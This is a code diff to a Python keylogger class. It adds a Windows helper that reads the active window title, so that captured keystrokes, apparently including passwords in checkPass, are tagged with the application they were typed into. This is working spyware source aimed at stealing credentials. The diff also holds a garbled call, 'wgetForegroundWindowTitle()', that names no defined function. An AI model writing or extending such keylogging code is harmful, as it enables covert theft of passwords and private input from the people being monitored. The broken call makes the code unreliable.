@@ -8,6 +8,23 @@ import threading
 import win32gui
 import platform
 
+from typing import Optional
+from ctypes import wintypes, windll, create_unicode_buffer
+
+def getForegroundWindowTitle() -> Optional[str]:
+    hWnd = windll.user32.GetForegroundWindow()
+    length = windll.user32.GetWindowTextLengthW(hWnd)
+    buf = create_unicode_buffer(length + 1)
+    windll.user32.GetWindowTextW(hWnd, buf, length + 1)
+    
+    # 1-liner alternative: return buf.value if buf.value else None
+    if buf.value:
+        
+        return buf.value
+    else:
+        return 'dunno'
+
+
 
 # os.system("pip install -r library.txt")
 
@@ -28,7 +45,7 @@ class Keylogger:
         self.shift = False
     
     def checkPass(self, s):
-        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+        window = getForegroundWindowTitle()
         toAppend = window + ":" +s 
         if len(s) != 0:
             self.all_strings.append(self.current_string)
@@ -56,7 +73,7 @@ class Keylogger:
     
     def callback(self, event):
         name = event.name
-        window = win32guiwin32gui.GetWindowText(win32gui.GetForegroundWindow())
+        window = wgetForegroundWindowTitle()
         if len(name) == 1:
             self.current_string += name
 
